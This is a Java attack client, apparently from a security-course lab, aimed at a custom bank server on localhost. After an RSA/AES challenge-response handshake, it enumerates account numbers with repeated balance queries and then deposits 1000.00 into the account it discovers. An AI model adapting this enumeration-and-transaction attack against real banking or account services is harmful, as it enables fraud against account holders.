import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.security.KeyFactory;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.NoSuchProviderException;
import java.net.UnknownHostException;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.SecureRandom;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.PKCS8EncodedKeySpec;
import java.security.spec.X509EncodedKeySpec;
import java.util.ArrayList;
import java.util.Base64;

import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

import org.json.simple.JSONObject;

import javax.crypto.spec.IvParameterSpec;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;

public class accountAttack {
    
    public byte[] initializationVector;
    public PrivateKey privateKey;
    public PublicKey publicKey;
    public SecretKey operationKey;
	public String account;
    public String response = "130";
	public Socket socket;
	public MBeC mb;

    public accountAttack() throws Exception{


		this.mb = new MBeC();
        setArgs();
        loop();

    }

    public void setArgs() throws NoSuchAlgorithmException, NoSuchProviderException{

        KeyPair keypair = this.mb.generateKeyPair();
        this.privateKey = keypair.getPrivate();
        this.publicKey = keypair.getPublic();
        this.initializationVector = this.mb.createInitializationVector();

    }

    public void loop() throws Exception{

        int account = 0; 

        while (this.response == "130") {
            String req = "-g " + account;
			this.socket = new Socket("127.0.0.1", 3000);
            ObjectOutputStream out = new ObjectOutputStream(this.socket.getOutputStream());
            ObjectInputStream in = new ObjectInputStream(this.socket.getInputStream());

            authenticate(out,in);
            sendRequest(req,in,out);
			System.out.println("Account is " + account + " Response is " + this.response);
            account++;

			in.close();
			out.close();
        }

        System.out.println(this.response);

		String req = "-d " + (account-1) + " 1000.00";
		this.socket = new Socket("127.0.0.1", 3000);
		ObjectOutputStream out = new ObjectOutputStream(this.socket.getOutputStream());
		ObjectInputStream in = new ObjectInputStream(this.socket.getInputStream());

        authenticate(out,in);
        sendRequest(req,in,out);


    }

    public void sendRequest(String req, ObjectInputStream in , ObjectOutputStream out) throws Exception{

        String hash = mb.getHash(req.getBytes());
        StringBuilder t = new StringBuilder();
        
        String separator2 = "!#--#!";
        String separatorNonce = "!#--!#";

        t.append(req);
        t.append(separator2);
        t.append(hash);
        t.append(separatorNonce);
        t.append(mb.generateNonce());
        
        
        if(this.operationKey != null) {
            
            byte[] encryptRequest = mb.encryptSecret(t.toString().getBytes(StandardCharsets.UTF_8), this.operationKey, this.initializationVector);
            
                                
            out.writeObject(encryptRequest);
            
            System.out.println("À espera de resposta...");
            
            byte[] ans = (byte[]) in.readObject();
            
            String ans1 = new String(mb.decryptSecret(ans, this.operationKey, this.initializationVector));
            
            if(ans1.length() < 3) {
                this.response = "130";
                
            } else {
                this.response = ans1;
                
            }
        }
            
    }


    private int authenticate(ObjectOutputStream out, ObjectInputStream in) {
		File bankFile1 = new File("bank.auth");
		FileInputStream bankIn;
		
		if(!bankFile1.exists()) {
			System.out.println("ERROR: 130");
			System.exit(130);
		}
		
		
		try {
			
			//read bank pub key
			bankIn = new FileInputStream(bankFile1);
			byte [] bankPubKeyByte = bankIn.readAllBytes();
			
			PublicKey bankPubKey = KeyFactory.getInstance("RSA").generatePublic(new X509EncodedKeySpec(bankPubKeyByte));
			
			//1 - envia identificaão, challenge e a sua chave pública -> encriptado com chave publica de banco
			String[] challengeInfo = mb.createChallenge();
			
			String challenge = challengeInfo[0];
			String challengeSolution = challengeInfo[1];
			
			String separator = "#!--!#";
			String separator2 = "!#--#!";
			
			
			StringBuilder sb = new StringBuilder();
			sb.append(account);
			sb.append(separator);
			sb.append(challenge);
			sb.append(separator);
			sb.append(Base64.getEncoder().encodeToString(this.publicKey.getEncoded()));
			
			String hash1 = mb.getHash(sb.toString().getBytes());
			
			sb.append(separator2);
			sb.append(hash1);
			
			
			
			out.writeObject(mb.encryptPub(bankPubKey, sb.toString().getBytes()));
			
			//2 - recebe do banco a resposta ao desafio e um novo desafio -> encriptado com chave publica do cliente
			byte[] stResponse = (byte[]) in.readObject();

			byte[] unencryptedStResponse = mb.decrypt(this.privateKey, stResponse);
			
			String h = new String(unencryptedStResponse);
			
			String[] x0 = h.split(separator2);
			
			if(!mb.getHash(x0[0].getBytes()).equals(x0[1])) {
				JSONObject obj = new JSONObject();
				
				byte[] ansNonce = mb.encryptSecret(obj.toJSONString().getBytes(), this.operationKey, this.initializationVector);
				
				out.writeObject(ansNonce);
				out.close();
			}
			
					
			
			String[] x = x0[0].split(separator);
			
			
			if(challengeSolution.equals(x[1])) {
				
				//3 - envia resposta do desafio -> encriptada com chave publica do banco
				
				String challengeToSolve = x[2];
				
				String solution = String.valueOf(mb.resolveChallenge(challengeToSolve));

				
				StringBuilder sb1 = new StringBuilder();
				sb1.append(account);
				sb1.append(separator);
				sb1.append(solution);
				
				String hash3 = mb.getHash(sb1.toString().getBytes());
				
				sb1.append(separator2);
				sb1.append(hash3);
				
				out.writeObject(mb.encryptPub(bankPubKey, sb1.toString().getBytes()));
				
				
				//4 - recebe chave simetrica a utilizar futuramente -> encriptada com chave publica do cliente
				
				byte[] lastResponse = (byte []) in.readObject();
				
				byte[] unencryptedLastResponse = mb.decrypt(this.privateKey, lastResponse);
				
				String last = new String(unencryptedLastResponse);
				
				String[] lastHash = last.split(separator2);
				
				
				this.initializationVector = Base64.getDecoder().decode(lastHash[1]);
				
				
				String[] last1 = lastHash[0].split(separator);
				
				
				byte[] opKeyByte = Base64.getDecoder().decode(last1[1]);
				
				this.operationKey = mb.bytesToSecretKey(opKeyByte);
				
								
				return 0;
				
			}else {
								
				StringBuilder sb2 = new StringBuilder();
				sb2.append(account);
				sb2.append(separator);
				sb2.append("Resposta errada");
				
				String hashError = mb.getHash(sb2.toString().getBytes());
				
				sb2.append(separator2);
				sb2.append(hashError);
				out.writeObject(mb.encryptPub(bankPubKey, sb2.toString().getBytes()));
				
				return -2;
			}


            			
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (InvalidKeySpecException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (NoSuchAlgorithmException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return -1;
	}

}
